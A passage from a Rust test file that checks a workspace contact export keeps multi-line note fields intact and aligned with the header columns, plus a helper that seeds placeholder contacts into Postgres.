            .bind(json!({"note": note}))
            .execute(&pool)
            .await
            .unwrap();
    }
    let (head, rows) = export(&admin, ws, json!({})).await;
    assert_eq!(rows.len(), notes.len(), "a line break started a new record");
    assert!(rows.iter().all(|r| r.len() == head.len()));
    let (email, note) = (col(&head, "email"), col(&head, "attr:note"));
    for (e, want) in notes {
        let row = rows.iter().find(|r| r[email] == e).unwrap();
        assert_eq!(row[note], want, "{e}");
    }
}

async fn seed(pool: &PgPool, ws: Uuid, n: i64) {
    sqlx::query(
        "insert into contacts (id, workspace_id, email, first_name, last_name) \
         select gen_random_uuid(), $1, 'person' || g || '@example.com', 'First' || g, 'Last' || g \
         from generate_series(1, $2) g",
    )
    .bind(ws)
    .bind(n)
    .execute(pool)
    .await
    .unwrap();
}
